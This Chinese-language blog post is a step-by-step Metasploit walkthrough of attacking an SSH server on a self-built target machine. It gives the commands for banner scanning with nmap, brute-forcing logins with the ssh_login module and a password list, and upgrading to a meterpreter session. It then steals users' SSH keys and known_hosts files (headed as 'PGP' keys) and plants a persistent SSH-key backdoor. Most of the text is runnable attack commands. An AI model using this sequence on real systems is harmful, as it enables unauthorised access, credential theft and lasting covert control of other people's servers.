---
title: 利用msf进行SSH渗透
layout: post
tags:
  - sec
  - hack
  - skills
  - windows
  - hijacking
category: 
  - hack
  - sec
  - skills
comments: true
share: true
description: 搭建靶机，利用msf进行SSH渗透
---

* TOC
{:toc}

搭建靶机，利用msf进行SSH渗透

<!--more-->

## 搭建环境

### 安装openssh

```cpp
sudo apt-get install openssh-server
```


![](/img/hack/ssh攻击/1507599755711.png)

## 抓取SSH Banner

**nmap:**

```javascript
nmap -sV 192.168.222.147
```

![](/img/hack/ssh攻击/1507602070398.png)

**使用msf的db_nmap：**

```javascript
msf > db_status

msf > db_nmap -sV 192.168.222.147
```

![](/img/hack/ssh攻击/1507602233263.png)

**使用msf的辅助模块查询版本号：**

```javascript
msf > use auxiliary/scanner/ssh/ssh_version 

msf auxiliary(ssh_version) > set RHOSTS 192.168.222.147
RHOSTS => 192.168.222.147


msf auxiliary(ssh_version) > exploit 
```

![](/img/hack/ssh攻击/1507602392356.png)



## 爆破

```javascript
msf auxiliary(ssh_version) > use auxiliary/scanner/ssh/ssh_login

msf auxiliary(ssh_login) > set RHOSTS 192.168.222.147
RHOSTS => 192.168.222.147

msf auxiliary(ssh_login) > set USERPASS_FILE /root/Desktop/di.txt
USERPASS_FILE => /root/Desktop/di.txt

msf auxiliary(ssh_login) > exploit

msf auxiliary(ssh_login) > sessions 1
[*] Starting interaction with 1...

ifconfig
```

![](/img/hack/ssh攻击/1507601007476.png)

执行以下命令获得meterpreter 会话：

```javascript
sessions -u 2
sessions -l
```

![](/img/hack/ssh攻击/1507601279493.png)

## 窃取PGP密钥登陆ssh



收集目标机器上所有用户的`.ssh`目录内容，下载`known_hosts`和`authorized_key`以及其他文件：

```javascript
msf post(sshkey_persistence) > use post/multi/gather/ssh_creds 
msf post(ssh_creds) > set sessions 2
sessions => 2
msf post(ssh_creds) > exploit 
```

![](/img/hack/ssh攻击/1507623351726.png)


## 创建永久后门

给指定的用户添加ssh密钥，从而可通过ssh进行远程登陆

```javascript
msf post(ssh_creds) > use post/linux/manage/sshkey_persistence 
msf post(sshkey_persistence) > set sessions 2
sessions => 2
msf post(sshkey_persistence) > exploit 
```

![](/img/hack/ssh攻击/1507623557365.png)



